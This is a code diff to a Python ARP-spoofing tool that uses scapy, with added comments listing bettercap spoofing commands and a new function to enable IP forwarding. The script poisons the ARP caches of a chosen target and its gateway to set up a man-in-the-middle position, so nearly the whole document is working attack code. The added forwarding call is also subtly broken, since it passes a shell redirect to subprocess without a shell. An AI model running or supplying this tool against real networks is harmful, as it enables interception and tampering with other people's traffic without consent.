@@ -6,11 +6,19 @@
 # arpspoof -i [interface] -t [gateway ip] [target ip], fool the router
 # echo 1 > /proc/sys/net/ipv4/ip_forward, enable port forwarding (Linux security feature)
 
+# bettercap -iface [interface]
+# help [module]
+# net.probe on
+# net.show
+# set arp.spoof.fullduplex true, fool both the target and the router
+# set arp.spoof.targets [IP]
+# arp.spoof on
+
 import scapy.all as scapy
 import optparse
 import time
 import sys
-
+import subprocess
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -20,9 +28,9 @@ def get_arguments():
     parser.add_option("-g", "--gateway", dest="gateway", help="Gateway to be spoofed.")
     (options, arguments) = parser.parse_args()
     if not options.target:
-        print("[-] Please specify the target machine.")
+        parser.error("[-] Please specify the target machine.")
     if not options.gateway:
-        print("[-] Please specify the gateway.")
+        parser.error("[-] Please specify the gateway.")
     return options
 
 def arp_spoof(target_ip, spoof_ip):
@@ -60,10 +68,17 @@ def restore(dst_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
     scapy.send(packet, verbose=False, count=4)
 
+def enable_ip_forwarding():
+    # need to enable ip forwarding
+    # otherwise the target machine will lost network connection
+    subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"])
+    print("[+] IP forwarding enabled.")
+
+
 options = get_arguments()
 sent_packet_count = 0
 ver = sys.version_info.major
-
+enable_ip_forwarding()
 try:
     while True:
         arp_spoof(options.target, options.gateway)
@@ -77,6 +92,3 @@ except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
     restore(options.target, options.gateway)
     restore(options.gateway, options.target)
-
-# need to set --> echo 1 > /proc/sys/net/ipv4/ip_forward
-# otherwise the target machine will lost network connection
